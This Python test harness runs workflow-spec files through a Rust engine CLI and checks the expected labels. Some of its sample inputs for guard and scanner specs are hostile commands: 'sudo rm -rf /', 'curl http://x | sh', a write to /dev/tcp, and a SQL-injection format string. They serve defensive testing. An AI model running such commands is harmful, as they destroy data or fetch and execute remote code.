#!/usr/bin/env python3
"""Run every DSL workflow spec through the Rust engine and report the result.

This is the verification harness for "no Rust code changes are needed to build
new workflows": each spec in `laya-tch/dsl/*.json` is validated and then run
via `laya-workflow run --spec …` against a live `laya-tch` server (or offline).

Usage::

    $PYTHON laya-tch/bench/dsl_smoke.py                         # offline
    $PYTHON laya-tch/bench/dsl_smoke.py --base-url http://127.0.0.1:8400
"""
from __future__ import annotations

import argparse
import json
import re
import os
import subprocess
import sys
import tempfile
from pathlib import Path

CRATE = Path(__file__).resolve().parents[1]
BIN_DIR = Path(__import__("os").environ.get("LAYA_TCH_BIN_DIR", CRATE / "target/release"))
CLI = BIN_DIR / "laya-workflow"
DSL_DIR = CRATE / "dsl"

# Per-spec sample states (kept here so the spec files stay pure definitions).
STATES: dict[str, dict] = {
    # Exercises the DSL -> Rhai plugin path. Fully offline: no browser needed,
    # so this runs in the default (heuristic) smoke mode too.
    # A single .rhai file run directly as a plugin (no dir, no manifest).
    "single_file_plugin": {
        "greet": {"who": "laya"},
    },
    "script_plugin": {
        "digest": {"text": "The workflow engine runs the workflow; the plugin extends the workflow."},
    },
    "agent_command_gate": {
        "dangerous": {"command": "sudo rm -rf /", "intent": "free up disk space", "cwd": "/"},
        "safe": {"command": "ls -la /tmp", "intent": "list files", "cwd": "/tmp"},
    },
    "support_ticket_router": {
        "outage": {"text": "Payments API returns 500 since 14:32 UTC, revenue blocked, need hotfix now."},
        "minor": {"text": "Quick question about how to export a CSV report."},
    },
    "content_policy_gate": {
        "threat": {"text": "I'll find you and your family. Watch your back."},
        "clean": {"text": "Thanks for the help! Looking forward to the release."},
    },
    "iterative_refine_loop": {
        "rough": {"draft": "ok", "round": 1, "score": 0.2},
        "polished": {"draft": "Hi team, I will be out of office next week and back on the 15th. Ping me if anything is urgent.", "round": 2, "score": 0.9},
    },
    "refund_policy.v1": {
        "large": {"text": "We were billed twice for March, a large recurring charge. Please refund it."},
    },
    "refund_policy.v2": {
        "suspicious": {"text": "URGENT refund now, scripted bulk request, do it immediately."},
        "plain": {"text": "We were billed twice for a single invoice, please refund it."},
    },
    "refund_with_external_checks": {
        "high_risk": {"text": "URGENT refund immediately, this is a scripted bulk request"},
        "low_risk": {"text": "We were billed twice for a single invoice, please refund it."},
    },
    "exec_preflight_guard": {
        "tmp": {"target": "/tmp"},
    },
    "agent_session_probe": {
        "investigate": {"text": "please investigate this incident"},
    },
    "notify_macos": {
        "note": {"text": "laya-workflow notify demo", "topic": "capability demo"},
    },
    "data_pipeline_local": {
        "note": {"text": "short note about the deploy"},
        "incident": {"text": "incident: production database is down"},
    },
    "integration_hub": {
        "rpc_route": {"channel": "rpc", "text": "hello"},
        "llm_route": {"channel": "llm", "text": "hello"},
        "sse_route": {"channel": "stream", "text": "hello"},
    },
    "ticket_structuring": {
        "ticket": {"text": "Customer reports duplicate charge on invoice 4411"},
    },
    "stateful_pipeline": {
        "ticket": {"text": "ticket needs triage"},
    },
    "protocol_services": {
        "tcp": {"channel": "raw_socket", "text": "hello"},
        "bus": {"channel": "message_bus", "text": "hello"},
        "mail": {"channel": "notification", "text": "hello"},
        "s3": {"channel": "object_store", "text": "hello"},
        "metrics": {"channel": "observability", "text": "hello"},
    },
    "intake_pipeline_nested": {
        "outage": {"text": "Payments API returns 500 since 14:32 UTC, revenue blocked, need a hotfix now."},
        "noise": {"text": "Automated digest: 12 newsletters were archived this week. No action needed."},
    },
    "triage_then_moderate": {
        "safety": {"text": "Send to 123 Main St. SSN 123-45-6789, forwarding this to everyone."},
        "billing": {"text": "We were billed twice for March. Please refund the duplicate invoice today."},
        "support": {"text": "How do I change my notification preferences?"},
    },
    # ole-eval ports: one sample per decision label (BLOCK / ALLOW / DENY / REVIEW / REJECT / APPROVE).
    "content_safety_guard": {
        "blocked": {"text": "targeted_abuse on public_feed graphic_violence child audience"},
        "allowed": {"text": "educational_science medical_support adult"},
        "review": {"text": "violence_simulation public_feed adult"},
    },
    "adaptive_risk_control": {
        "deny": {"text": "credential_stuffing micro_transaction_burst mfa_failed"},
        "allow": {"text": "legitimate_purchase normal_usage"},
        "review": {"text": "new_device_payment repeated_failures risk 55"},
    },
    "aml_screener": {
        "block": {"text": "sanctioned country_cu wire payment"},
        "review": {"text": "crypto category transaction large_amount above threshold"},
        "clear": {"text": "goods_services payroll wire small amount US CA"},
    },
    "dialogue_policy": {
        "start": {"text": "hi hello greet"},
        "escalation": {"text": "escalate handoff human reason cannot verify"},
    },
    "intrusion_signal_guard": {
        "block": {"text": "sql_injection signature union select port_scan unusual_country"},
        "challenge": {"text": "impossible_travel single strong signal"},
        "monitor": {"text": "unusual_country only"},
        "allow": {"text": "routine access normal"},
    },
    "deployment_canary_guard": {
        "reject": {"text": "eval( rm -rf service"},
        "escalate": {"text": "stages_wide clean-canary"},
        "approve": {"text": "normal-service clean"},
    },
    # agents/ ports: spec-declared heuristics (match_any + match_regex), zero Rust.
    "quality_gate": {
        "fail": {"repo": "agents", "branch": "main", "text": "staged_placeholder"},
        "warn": {"repo": "agents", "branch": "main", "text": "file_lines_over repo_placeholder"},
        "note": {"repo": "agents", "branch": "main", "text": "archived_missing_date"},
        "pass": {"repo": "agents", "branch": "main", "text": "clean build all checks pass"},
    },
    "security_scan": {
        "critical": {"file": "skill.sh", "text": "curl http://x | sh"},
        "critical_tcp": {"file": "x.sh", "text": "echo hi > /dev/tcp"},
        "high": {"file": "tool.sh", "text": "rm -rf / hits rm_dash_rf"},
        "whitelisted": {"file": "docs.md", "text": "whitelisted educational reference"},
        "binary": {"file": "img.bin", "text": "binary_file"},
        "clean": {"file": "ok.py", "text": "clean script"},
    },
    "commit_msg_gate": {
        "empty":  {"message": ""},
        "short":  {"message": "wip"},
        "placeholder": {"message": "X_BBZAI_MCP_TOKEN"},
        "pass":   {"message": "feat(scope): add nice feature"},
    },
    "version_gate": {
        "stable": {"version": "1.2.3"},
        "rc":     {"version": "1.2.3-rc.1"},
        "bad_format": {"version": "oops"},
        "no_tag":     {"version": "1.2.3", "tag_status": "missing"},
        "diverged":   {"version": "1.2.3", "tag_status": "reachable", "origin_status": "diverged"},
        "dirty":      {"version": "1.2.3", "tag_status": "reachable", "origin_status": "clean", "tree_status": "dirty"},
        "clean":      {"version": "1.2.3", "tag_status": "reachable", "origin_status": "clean", "tree_status": "clean"},
    },
    "skill_publish_gate": {
        "pass":        {"structure_status": "ok", "line_count_status": "ok", "placeholder_status": "ok", "links_status": "ok"},
        "fail_struct": {"structure_status": "missing_required"},
        "fail_lines":  {"line_count_status": "over_limit"},
        "fail_ph":     {"placeholder_status": "placeholder_found"},
        "fail_links":  {"links_status": "broken_links"},
    },
    "workflow_guardian": {
        "ok":     {"task_layer": "ok", "knowledge_layer": "ok", "collaboration_layer": "ok"},
        "fail_task": {"task_layer": "fail"},
        "warn_know": {"task_layer": "ok", "knowledge_layer": "warn"},
        "fail_collab": {"task_layer": "ok", "knowledge_layer": "ok", "collaboration_layer": "machines_missing"},
    },
    "ssl_certificate_expiry": {
        "ok":       {"cert_status": "ok", "days_left": 90, "force_mode": "none"},
        "warn":     {"cert_status": "ok", "days_left": 15, "force_mode": "none"},
        "warn0":    {"cert_status": "ok", "days_left": 0, "force_mode": "none"},
        "expired":  {"cert_status": "ok", "days_left": -3, "force_mode": "none"},
        "unreadable": {"cert_status": "missing", "days_left": 90},
        "forced":   {"cert_status": "ok", "days_left": 90, "force_mode": "force"},
        "ok30":     {"cert_status": "ok", "days_left": 30, "force_mode": "none"},
    },
    "project_structure_guard": {
        "fail":  {"failures": 2, "warnings": 3, "health_score": 74},
        "warn":  {"failures": 0, "warnings": 1, "health_score": 97},
        "ok":    {"failures": 0, "warnings": 0, "health_score": 100},
        "missing": {},
    },
    "htmx_app_lint": {
        "fail_yaml":   {"yaml_schema_fail": True},
        "fail_tpls":   {"templates_missing": True},
        "fail_parse":  {"template_parse_err": True},
        "warn_bb":     {"back_button_advisory": True},
        "pass":        {},
    },
    "coding_env_check": {
        "fail":     {"failed": 1, "warned": 0, "passed": 10, "pass_rate": 90},
        "warn":     {"failed": 0, "warned": 2, "passed": 10, "pass_rate": 83},
        "perfect":  {"failed": 0, "warned": 0, "passed": 12, "pass_rate": 100},
        "missing":  {},
    },
    "mlu270_smoke": {
        "fail_tool":   {"cntool_missing": True},
        "fail_smoke":  {"inference_smoke_failed": True},
        "warn_ver":    {"version_mismatch_warn": True},
        "pass":        {},
    },
    "bitx_wrapper_test": {
        "fail":     {"failed": 1, "skipped": 0, "passed": 11},
        "warn":     {"failed": 0, "skipped": 2, "passed": 10},
        "pass":     {"failed": 0, "skipped": 0, "passed": 12},
        "missing":  {},
    },
    "task_quality_gate": {
        "fail_compile":  {"compile_failed": True, "line_cover_pct": 92, "branch_cover_pct": 88, "agents_md_lines": 100},
        "fail_test":     {"test_failed": True, "line_cover_pct": 92, "branch_cover_pct": 88, "agents_md_lines": 100},
        "fail_linecov":  {"line_cover_pct": 65, "branch_cover_pct": 88, "agents_md_lines": 100},
        "fail_branchcov": {"line_cover_pct": 92, "branch_cover_pct": 50, "agents_md_lines": 100},
        "fail_ph":       {"placeholder_found": True, "line_cover_pct": 92, "branch_cover_pct": 88, "agents_md_lines": 100},
        "fail_oversize": {"oversized_file": True, "line_cover_pct": 92, "branch_cover_pct": 88, "agents_md_lines": 100},
        "fail_agentsmd": {"agents_md_lines": 620, "line_cover_pct": 92, "branch_cover_pct": 88},
        "fail_secret":   {"secret_hit": "password=\"hunter2hunter2\"", "line_cover_pct": 92, "branch_cover_pct": 88, "agents_md_lines": 100},
        "fail_sql":      {"sql_injection": "fmt.Sprintf(\"SELECT * FROM %s\", table)", "line_cover_pct": 92, "branch_cover_pct": 88, "agents_md_lines": 100},
        "warn_naming":   {"bad_doc_naming": True, "line_cover_pct": 92, "branch_cover_pct": 88, "agents_md_lines": 100},
        "pass":          {"line_cover_pct": 92, "branch_cover_pct": 88, "agents_md_lines": 420},
        "pass_agents500": {"agents_md_lines": 500, "line_cover_pct": 92, "branch_cover_pct": 88},
        "fail_agents501": {"agents_md_lines": 501, "line_cover_pct": 92, "branch_cover_pct": 88},
        "pass_no_branch": {"line_cover_pct": 92, "agents_md_lines": 100},
    },
}


# Expected verdict label per sample state for specs that declare one. Only
# specs listed here are label-asserted, so existing capability specs (whose
# samples depend on external services) keep their current report-only flow.
EXPECT: dict[str, dict[str, str]] = {
    "quality_gate": {
        "fail": "FAIL", "warn": "WARN", "note": "NOTE", "pass": "PASS",
    },
    "security_scan": {
        "critical": "QUARANTINE_CRITICAL", "critical_tcp": "QUARANTINE_CRITICAL",
        "high": "QUARANTINE_HIGH", "whitelisted": "CLEAN",
        "binary": "SKIP", "clean": "CLEAN",
    },
    "commit_msg_gate": {
        "empty": "FAIL_EMPTY", "short": "FAIL_TOO_SHORT",
        "placeholder": "FAIL_PLACEHOLDER", "pass": "PASS",
    },
    "version_gate": {
        "stable": "PASS_STABLE", "rc": "PASS_RC",
        "bad_format": "FAIL_INVALID_VERSION", "no_tag": "FAIL_TAG_UNREACHABLE",
        "diverged": "FAIL_ORIGIN_DIVERGED", "dirty": "FAIL_DIRTY_TREE",
        "clean": "PASS_STABLE",
    },
    "skill_publish_gate": {
        "pass": "PASS", "fail_struct": "FAIL_STRUCTURE",
        "fail_lines": "FAIL_LINE_COUNT", "fail_ph": "FAIL_PLACEHOLDER",
        "fail_links": "FAIL_LINKS",
    },
    "workflow_guardian": {
        "ok": "OK", "fail_task": "FAIL_TASK_LAYER",
        "warn_know": "WARN_KNOWLEDGE_LAYER", "fail_collab": "FAIL_COLLABORATION_LAYER",
    },
    "project_structure_guard": {
        "fail": "FAIL", "warn": "WARN", "ok": "OK", "missing": "FAIL",
    },
    "htmx_app_lint": {        "fail_yaml": "FAIL_YAML_SCHEMA", "fail_tpls": "FAIL_TEMPLATES_MISSING",        "fail_parse": "FAIL_TEMPLATE_PARSE", "warn_bb": "WARN", "pass": "PASS",    },    "coding_env_check": {        "fail": "FAIL", "warn": "WARN", "perfect": "PERFECT", "missing": "FAIL",    },    "mlu270_smoke": {        "fail_tool": "FAIL", "fail_smoke": "FAIL", "warn_ver": "WARN", "pass": "PASS",    },    "bitx_wrapper_test": {        "fail": "FAIL", "warn": "WARN", "pass": "PASS", "missing": "FAIL",    },
    "task_quality_gate": {
        "fail_compile": "FAIL", "fail_test": "FAIL", "fail_linecov": "FAIL",
        "fail_branchcov": "FAIL", "fail_ph": "FAIL", "fail_oversize": "FAIL",
        "fail_agentsmd": "FAIL", "fail_secret": "FAIL", "fail_sql": "FAIL",
        "warn_naming": "WARN", "pass": "PASS", "pass_agents500": "PASS",
        "fail_agents501": "FAIL", "pass_no_branch": "PASS",
    },
    "ssl_certificate_expiry": {
        "ok": "OK", "warn": "WARN_RENEW", "warn0": "WARN_RENEW",
        "expired": "EXPIRED", "unreadable": "FAIL_UNREADABLE",
        "forced": "RENEW_FORCED", "ok30": "OK",
    },
}


def run_cli(args: list[str]) -> tuple[int, str]:
    # Specs reference ${env.LAYA_STORE_DIR} / ${env.LAYA_WORK_DIR} / ${env.LAYA_GOAL_DIR} for their
    # scratch state. The engine now fails closed when such a variable is unset
    # (instead of writing to a bogus path), so give the harness temp dirs.
    env = dict(os.environ)
    base = Path(tempfile.gettempdir()) / "laya_dsl_smoke"
    for var in ("LAYA_STORE_DIR", "LAYA_WORK_DIR", "LAYA_GOAL_DIR"):
        env.setdefault(var, str(base / var.lower()))
        Path(env[var]).mkdir(parents=True, exist_ok=True)
    p = subprocess.run([str(CLI), *args], capture_output=True, text=True, env=env)
    return p.returncode, p.stdout + p.stderr


def summarize(payload: str) -> dict:
    """Strip the `backend:` banner line and parse the JSON body."""
    body = payload.split("backend:", 1)[-1]
    start = body.find("{")
    return json.loads(body[start:]) if start >= 0 else {}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", default=None,
                    help="live laya-tch server; omit to run the offline heuristic backend")
    args = ap.parse_args()

    live = ["--base-url", args.base_url] if args.base_url else []
    mode = f"live @ {args.base_url}" if args.base_url else "offline heuristic"

    specs = sorted(DSL_DIR.rglob("*.json"))   # folder tree
    if not specs:
        print(f"no specs found under {DSL_DIR}")
        return 1

    total = fails = 0
    print(f"engine backend: {mode}\nspecs: {len(specs)}\n")
    for spec in specs:
        total += 1
        rc, out = run_cli([*live, "validate", "--spec", str(spec)])
        if rc != 0:
            fails += 1
            print(f"[FAIL] {spec.name}: validate failed\n{out}")
            continue
        ver = re.search(r"dsl_version: (\d+)", out)
        graph = summarize(out)
        print(f"[spec] {spec.relative_to(DSL_DIR)}  (dsl_version {ver.group(1) if ver else '1'})")
        print(f"       start={graph.get('start')}  nodes={list(graph.get('nodes', {}))}")

        states = STATES.get(spec.stem)
        if not states:
            print("       (no sample states registered; validate only)")
            continue
        for label, st in states.items():
            rc, out = run_cli([*live, "run", "--spec", str(spec), "--state", json.dumps(st)])
            if rc != 0:
                fails += 1
                print(f"       [FAIL] {label}: {out.strip()[-300:]}")
                continue
            res = summarize(out)
            steps = res.get("trace", {}).get("steps", [])
            chain = " -> ".join(f"{s['node']}:{s['action']}" for s in steps) or "(no steps)"
            keys = {k: res["result"].get(k) for k in
                    ("gate_action", "label", "category", "action_answer") if k in res.get("result", {})}
            print(f"       {label:10} final={res.get('trace', {}).get('final_action')}  {chain}")
            if keys:
                print(f"                  payload={json.dumps(keys, ensure_ascii=False)}")
            want = EXPECT.get(spec.stem, {}).get(label)
            got = res.get("result", {}).get("label")
            if want is not None and got != want:
                fails += 1
                print(f"       [FAIL] {label}: expected label {want!r}, got {got!r}")

    print(f"\n{total - fails}/{total} specs OK")
    return 0 if fails == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
